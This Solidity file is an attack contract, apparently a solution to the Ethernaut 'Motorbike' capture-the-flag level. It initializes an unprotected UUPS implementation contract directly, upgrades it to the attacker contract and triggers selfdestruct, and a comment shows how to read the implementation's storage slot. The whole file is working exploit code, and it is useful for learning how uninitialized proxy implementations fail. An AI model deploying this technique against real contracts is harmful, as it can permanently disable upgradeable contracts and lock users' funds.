// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract MotorbikeAttackAhh {
    constructor() public payable {}

    function destroy() public payable {
        selfdestruct(payable(msg.sender));
    }

    // oldImplementation: which is the current implementation of the Engine in Morobike
    // Can be got by running the following code in the console:
    // oldImplementation = await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
    function setImplementation(address oldImplementation) public payable {
        bool success;
        bytes memory data;
        // intilizing the contract;
        (success, data) = oldImplementation.call(abi.encodeWithSignature("initialize()"));
        require(success && data.length == 0, "initilize");
        // replacing the implementation with this contract and calling destroy
        bytes memory toBeCalledData = abi.encodeWithSignature("destroy()");
        (success, data) = oldImplementation.call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), toBeCalledData)
        );
        require(success && data.length == 0, "upgradeToAndCall");
        // sending back all the funds gotten from contract to the caller
        selfdestruct(payable(msg.sender));
    }
}
